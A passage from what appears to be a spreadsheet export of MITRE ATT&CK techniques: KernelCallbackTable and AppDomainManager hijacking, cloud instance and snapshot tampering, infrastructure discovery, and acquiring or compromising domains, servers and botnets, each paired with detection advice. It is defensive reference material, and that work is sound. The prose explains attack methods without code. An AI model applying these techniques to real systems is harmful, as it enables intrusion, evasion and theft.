A pointer to the memory address of the &lt;code&gt;KernelCallbackTable&lt;/code&gt; can be obtained by locating the PEB (ex: via a call to the &lt;code&gt;NtQueryInformationProcess()&lt;/code&gt; [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the &lt;code&gt;KernelCallbackTable&lt;/code&gt; can be duplicated, and a function in the table (e.g., &lt;code&gt;fnCOPYDATA&lt;/code&gt;) set to the address of a malicious payload (ex: via &lt;code&gt;WriteProcessMemory()&lt;/code&gt;). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT January 2022)
The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the &lt;code&gt;KernelCallbackTable&lt;/code&gt; may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the &lt;code&gt;KernelCallbackTable&lt;/code&gt; to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.</t>
  </si>
  <si>
    <t>Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious behaviors that could relate to post-compromise behavior.
Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances. for known bad sequence of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as &lt;code&gt;WriteProcessMemory()&lt;/code&gt; and &lt;code&gt;NtQueryInformationProcess()&lt;/code&gt; with the parameter set to &lt;code&gt;ProcessBasicInformation&lt;/code&gt; may be used for this technique.(Citation: Lazarus APT January 2022)</t>
  </si>
  <si>
    <t>T1574.014</t>
  </si>
  <si>
    <t>AppDomainManager (T1574.014)</t>
  </si>
  <si>
    <t>File: File Creation, Module: Module Load, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may execute their own malicious payloads by hijacking how the .NET `AppDomainManager` loads assemblies. The .NET framework uses the `AppDomainManager` class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (`.exe` or `.dll` binaries compiled to run as .NET code) may be loaded into an application domain as executable code.(Citation: Microsoft App Domains) 
Known as "AppDomainManager injection," adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (`.config`) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.(Citation: PenTestLabs AppDomainManagerInject)(Citation: PwC Yellow Liderc)(Citation: Rapid7 AppDomain Manager Injection)</t>
  </si>
  <si>
    <t>T1578</t>
  </si>
  <si>
    <t>Cloud Service: Cloud Service Metadata, Instance: Instance Creation, Instance: Instance Deletion, Instance: Instance Metadata, Instance: Instance Modification, Instance: Instance Start, Instance: Instance Stop, Snapshot: Snapshot Creation, Snapshot: Snapshot Deletion, Snapshot: Snapshot Metadata, Snapshot: Snapshot Modification, Volume: Volume Creation, Volume: Volume Deletion, Volume: Volume Metadata, Volume: Volume Modification</t>
  </si>
  <si>
    <t>An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.
Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)</t>
  </si>
  <si>
    <t>Establish centralized logging for the activity of cloud compute infrastructure components. Monitor for suspicious sequences of events, such as the creation of multiple snapshots within a short period of time or the mount of a snapshot to a new instance by a new or unexpected user. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.</t>
  </si>
  <si>
    <t>T1578.001</t>
  </si>
  <si>
    <t>Create Snapshot (T1578.001)</t>
  </si>
  <si>
    <t>Snapshot: Snapshot Creation, Snapshot: Snapshot Metadata</t>
  </si>
  <si>
    <t>An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004) where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.
An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002), mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.(Citation: Mandiant M-Trends 2020)</t>
  </si>
  <si>
    <t>The creation of a snapshot is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities such as the creation of one or more snapshots and the restoration of these snapshots by a new user account.
In AWS, CloudTrail logs capture the creation of snapshots and all API calls for AWS Backup as events. Using the information collected by CloudTrail, you can determine the request that was made, the IP address from which the request was made, which user made the request, when it was made, and additional details.(Citation: AWS Cloud Trail Backup API).
In Azure, the creation of a snapshot may be captured in Azure activity logs. Backup restoration events can also be detected through Azure Monitor Log Data by creating a custom alert for completed restore jobs.(Citation: Azure - Monitor Logs)
Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of the &lt;code&gt;gcloud compute instances create&lt;/code&gt; command to create a new VM disk from a snapshot.(Citation: Cloud Audit Logs) It is also possible to detect the usage of the GCP API with the &lt;code&gt;"sourceSnapshot":&lt;/code&gt; parameter pointed to &lt;code&gt;"global/snapshots/[BOOT_SNAPSHOT_NAME]&lt;/code&gt;.(Citation: GCP - Creating and Starting a VM)</t>
  </si>
  <si>
    <t>T1578.002</t>
  </si>
  <si>
    <t>An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation: Mandiant M-Trends 2020)
Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.</t>
  </si>
  <si>
    <t>The creation of a new instance or VM is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, the creation of an instance by a new user account or the unexpected creation of one or more snapshots followed by the creation of an instance may indicate suspicious activity.
In AWS, CloudTrail logs capture the creation of an instance in the &lt;code&gt;RunInstances&lt;/code&gt; event, and in Azure the creation of a VM may be captured in Azure activity logs.(Citation: AWS CloudTrail Search)(Citation: Azure Activity Logs) Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of &lt;code&gt;gcloud compute instances create&lt;/code&gt; to create a VM.(Citation: Cloud Audit Logs)</t>
  </si>
  <si>
    <t>T1578.003</t>
  </si>
  <si>
    <t>Delete Cloud Instance (T1578.003)</t>
  </si>
  <si>
    <t>Instance: Instance Deletion, Instance: Instance Metadata</t>
  </si>
  <si>
    <t>An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.
An adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and later terminate the instance after achieving their objectives.(Citation: Mandiant M-Trends 2020)</t>
  </si>
  <si>
    <t>The deletion of a new instance or virtual machine is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, detecting a sequence of events such as the creation of an instance, mounting of a snapshot to that instance, and deletion of that instance by a new user account may indicate suspicious activity.
In AWS, CloudTrail logs capture the deletion of an instance in the &lt;code&gt;TerminateInstances&lt;/code&gt; event, and in Azure the deletion of a VM may be captured in Azure activity logs.(Citation: AWS CloudTrail Search)(Citation: Azure Activity Logs) Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of &lt;code&gt;gcloud compute instances delete&lt;/code&gt; to delete a VM.(Citation: Cloud Audit Logs)</t>
  </si>
  <si>
    <t>T1578.004</t>
  </si>
  <si>
    <t>Revert Cloud Instance (T1578.004)</t>
  </si>
  <si>
    <t>Instance: Instance Metadata, Instance: Instance Modification, Instance: Instance Start, Instance: Instance Stop</t>
  </si>
  <si>
    <t>An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.
Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)</t>
  </si>
  <si>
    <t>Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to snapshots and rollbacks and VM configuration changes, that are occurring outside of normal activity. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.</t>
  </si>
  <si>
    <t>T1578.005</t>
  </si>
  <si>
    <t>Cloud Service: Cloud Service Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim’s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.
For example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional [Resource Hijacking](https://attack.mitre.org/techniques/T1496) without raising suspicion by using up a victim’s entire quota.(Citation: Microsoft Cryptojacking 2023) Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.(Citation: Microsoft Azure Policy)
Adversaries may also modify settings that affect where cloud resources can be deployed, such as enabling [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535). </t>
  </si>
  <si>
    <t>T1580</t>
  </si>
  <si>
    <t>Cloud Storage: Cloud Storage Enumeration, Instance: Instance Enumeration, Snapshot: Snapshot Enumeration, Volume: Volume Enumeration</t>
  </si>
  <si>
    <t>An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.
Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a &lt;code&gt;DescribeInstances&lt;/code&gt; API within the Amazon EC2 API that can return information about one or more instances within an account, the &lt;code&gt;ListBuckets&lt;/code&gt; API that returns a list of all buckets owned by the authenticated sender of the request, the &lt;code&gt;HeadBucket&lt;/code&gt; API to determine a bucket’s existence along with access permissions of the request sender, or the &lt;code&gt;GetPublicAccessBlock&lt;/code&gt; API to retrieve access block configuration for a bucket.(Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API)(Citation: AWS Get Public Access Block)(Citation: AWS Head Bucket) Similarly, GCP's Cloud SDK CLI provides the &lt;code&gt;gcloud compute instances list&lt;/code&gt; command to list all Google Compute Engine instances in a project (Citation: Google Compute Instances), and Azure's CLI command &lt;code&gt;az vm list&lt;/code&gt; lists details of virtual machines.(Citation: Microsoft AZ CLI) In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).(Citation: Malwarebytes OSINT Leaky Buckets - Hioureas)
An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.(Citation: Expel IO Evil in AWS) The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as &lt;code&gt;DescribeDBInstances&lt;/code&gt; to determine size, owner, permissions, and network ACLs of database resources. (Citation: AWS Describe DB Instances) Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526), this technique focuses on the discovery of components of the provided services rather than the services themselves.</t>
  </si>
  <si>
    <t>Establish centralized logging for the activity of cloud infrastructure components. Monitor logs for actions that could be taken to gather information about cloud infrastructure, including the use of discovery API calls by new or unexpected users and enumerations from unknown or malicious IP addresses. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.</t>
  </si>
  <si>
    <t>T1583</t>
  </si>
  <si>
    <t>Domain Name: Active DNS, Domain Name: Domain Registration, Domain Name: Passive DNS, Internet Scan: Response Content, Internet Scan: Response Metadata</t>
  </si>
  <si>
    <t>PRE</t>
  </si>
  <si>
    <t>Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost.(Citation: Free Trial PurpleUrchin) Additionally, botnets are available for rent or purchase.
Use of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090), including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation: FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022) Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.</t>
  </si>
  <si>
    <t>Consider use of services that may aid in tracking of newly acquired infrastructure, such as WHOIS databases for domain registration information. 
Once adversaries have provisioned infrastructure (ex: a server for use in command and control), internet scans may help proactively discover adversary acquired infrastructure.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Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.</t>
  </si>
  <si>
    <t>T1583.001</t>
  </si>
  <si>
    <t>Domains (T1583.001)</t>
  </si>
  <si>
    <t>Domain Name: Active DNS, Domain Name: Domain Registration, Domain Name: Passive DNS</t>
  </si>
  <si>
    <t>Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.
Adversaries may use acquired domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute "IDN homograph attacks," creating visually similar lookalike domains used to deliver malware to victim machines.(Citation: CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation: httrack_unhcr)(Citation: lazgroup_idn_phishing)
Different URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique)
Adversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.(Citation: Categorisation_not_boundary)(Citation: Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering)
Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1)
In addition to legitimately purchasing a domain, an adversary may register a new domain in a compromised environment. For example, in AWS environments, adversaries may leverage the Route53 domain service to register a domain and create hosted zones pointing to resources of the threat actor’s choosing.(Citation: Invictus IR DangerDev 2024)</t>
  </si>
  <si>
    <t>Domain registration information is, by design, captured in public registration logs. Consider use of services that may aid in tracking of newly acquired domains, such as WHOIS databases and/or passive DNS. In some cases it may be possible to pivot on known pieces of domain registration information to uncover other infrastructure purchased by the adversary. Consider monitoring for domains created with a similar structure to your own, including under a different TLD. Though various tools and services exist to track, query, and monitor domain name registration information, tracking across multiple DNS infrastructures can require multiple tools/services or more advanced analytics.(Citation: ThreatConnect Infrastructure Dec 2020)
Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access and Command and Control.</t>
  </si>
  <si>
    <t>T1583.002</t>
  </si>
  <si>
    <t>DNS Server (T1583.002)</t>
  </si>
  <si>
    <t>Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.
By running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic ([DNS](https://attack.mitre.org/techniques/T1071/004)). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019)</t>
  </si>
  <si>
    <t>Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.</t>
  </si>
  <si>
    <t>T1583.003</t>
  </si>
  <si>
    <t>Virtual Private Server (T1583.003)</t>
  </si>
  <si>
    <t>Internet Scan: Response Content, Internet Scan: Response Metadata</t>
  </si>
  <si>
    <t>Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.
Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease)</t>
  </si>
  <si>
    <t>Once adversaries have provisioned a VPS (ex: for use as a command and control server), internet scans may reveal servers that adversaries have acquired.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Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.</t>
  </si>
  <si>
    <t>T1583.004</t>
  </si>
  <si>
    <t>Server (T1583.004)</t>
  </si>
  <si>
    <t>Adversaries may buy, lease, rent, or obtain physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), enabling [Phishing](https://attack.mitre.org/techniques/T1566) operations, or facilitating [Command and Control](https://attack.mitre.org/tactics/TA0011). Instead of compromising a third-party [Server](https://attack.mitre.org/techniques/T1584/004) or renting a [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused.(Citation: Free Trial PurpleUrchin)(Citation: Freejacked) 
Adversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.(Citation: NYTStuxnet)</t>
  </si>
  <si>
    <t>Once adversaries have provisioned a server (ex: for use as a command and control server), internet scans may reveal servers that adversaries have acquired.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Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.</t>
  </si>
  <si>
    <t>T1583.005</t>
  </si>
  <si>
    <t>Botnet (T1583.005)</t>
  </si>
  <si>
    <t>Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation: Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter)</t>
  </si>
  <si>
    <t>Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during [Phishing](https://attack.mitre.org/techniques/T1566), [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499), or [Network Denial of Service](https://attack.mitre.org/techniques/T1498).</t>
  </si>
  <si>
    <t>T1583.006</t>
  </si>
  <si>
    <t>Web Services (T1583.006)</t>
  </si>
  <si>
    <t>Internet Scan: Response Content</t>
  </si>
  <si>
    <t>Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566). Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise.(Citation: FireEye APT29) By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.</t>
  </si>
  <si>
    <t>Once adversaries leverage the web service as infrastructure (ex: for command and control), it may be possible to look for unique characteristics associated with adversary software, if known.(Citation: ThreatConnect Infrastructure Dec 2020)
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567).</t>
  </si>
  <si>
    <t>T1583.007</t>
  </si>
  <si>
    <t>Serverless (T1583.007)</t>
  </si>
  <si>
    <t>Adversaries may purchase and configure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acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS Apps Script Abuse 2021) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers - making it easier to [Hide Infrastructure](https://attack.mitre.org/techniques/T1665).(Citation: Detecting Command &amp; Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)</t>
  </si>
  <si>
    <t>T1583.008</t>
  </si>
  <si>
    <t>Malvertising (T1583.008)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements.(Citation: spamhaus-malvertising) Purchased ads may also target specific audiences using the advertising network’s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. 
Adversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software.(Citation: Masquerads-Guardio)(Citation: FBI-search) Adversary’s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts.(Citation: sentinelone-malvertising) 
Malvertising may be used to support [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.(Citation: BBC-malvertising)
Adversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement.(Citation: Masquerads-Guardio) Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.(Citation: spamhaus-malvertising) </t>
  </si>
  <si>
    <t>T1584</t>
  </si>
  <si>
    <t>Domain Name: Active DNS, Domain Name: Domain Registration, Domain Name: Passive DNS, Internet Scan: Response Content, Internet Scan: Response Metadata, Domain Name: Threat Feed</t>
  </si>
  <si>
    <t>Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, network devices, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.
Use of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) to further blend in and support staged information gathering and/or [Phishing](https://attack.mitre.org/techniques/T1566) campaigns.(Citation: FireEye DNS Hijack 2019) Additionally, adversaries may also compromise infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090) and/or proxyware services.(Citation: amnesty_nso_pegasus)(Citation: Sysdig Proxyjacking)
By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig)</t>
  </si>
  <si>
    <t>Consider monitoring for anomalous changes to domain registrant information and/or domain resolution information that may indicate the compromise of a domain. Efforts may need to be tailored to specific domains of interest as benign registration and resolution changes are a common occurrence on the internet. 
Once adversaries have provisioned compromised infrastructure (ex: a server for use in command and control), internet scans may help proactively discover compromised infrastructure.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Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.</t>
  </si>
  <si>
    <t>T1584.001</t>
  </si>
  <si>
    <t>Domain Name: Active DNS, Domain Name: Domain Registration, Domain Name: Passive DNS, Domain Name: Threat Feed</t>
  </si>
  <si>
    <t>Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.(Citation: ICANNDomainNameHijacking) Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account, taking advantage of renewal process gaps, or compromising a cloud service that enables managing domains (e.g., AWS Route53).(Citation: Krebs DNS Hijack 2019)
Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.(Citation: Microsoft Sub Takeover 2020)
Adversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.(Citation: Palo Alto Unit 42 Domain Shadowing 2022)</t>
  </si>
  <si>
    <t>Consider monitoring for anomalous changes to domain registrant information and/or domain resolution information that may indicate the compromise of a domain. Efforts may need to be tailored to specific domains of interest as benign registration and resolution changes are a common occurrence on the internet.
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.</t>
  </si>
  <si>
    <t>T1584.002</t>
  </si>
  <si>
    <t>DNS Server (T1584.002)</t>
  </si>
  <si>
    <t>Domain Name: Active DNS, Domain Name: Passive DNS, Domain Name: Threat Feed</t>
  </si>
  <si>
    <t>Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.
By compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye DNS Hijack 2019)  Additionally, adversaries may leverage such control in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004) to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications.(Citation: FireEye DNS Hijack 2019)(Citation: Crowdstrike DNS Hijack 2019) Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.(Citation: CiscoAngler)(Citation: Proofpoint Domain Shadowing)</t>
  </si>
  <si>
    <t>Consider monitoring for anomalous resolution changes for domain addresses. Efforts may need to be tailored to specific domains of interest as benign resolution changes are a common occurrence on the internet.
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.</t>
  </si>
  <si>
    <t>T1584.003</t>
  </si>
  <si>
    <t>Virtual Private Server (T1584.003)</t>
  </si>
  <si>
    <t>Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.(Citation: NSA NCSC Turla OilRig)
Compromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.</t>
  </si>
  <si>
